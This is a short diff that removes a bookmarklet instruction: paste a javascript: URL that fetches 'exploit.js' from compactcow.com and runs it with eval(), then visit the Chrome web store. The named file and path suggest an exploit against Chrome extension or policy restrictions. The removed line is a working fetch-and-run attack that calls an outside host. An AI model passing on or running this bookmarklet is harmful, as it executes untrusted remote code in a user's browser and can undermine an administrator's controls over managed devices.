@@ -1,4 +1,0 @@
-// Paste the code into the bookmark URL Section
-javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
-
-Go to this website: https://chrome.google.com/webstorex
